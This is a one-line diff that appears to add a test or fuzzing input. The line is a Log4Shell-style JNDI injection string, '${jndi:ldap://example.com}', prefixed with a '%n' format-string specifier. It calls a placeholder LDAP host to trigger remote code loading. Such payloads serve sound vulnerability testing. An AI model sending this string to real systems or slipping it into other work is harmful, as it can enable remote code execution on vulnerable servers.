@@ -1,0 +1,1 @@
+`%n${jndi:ldap://example.com}`
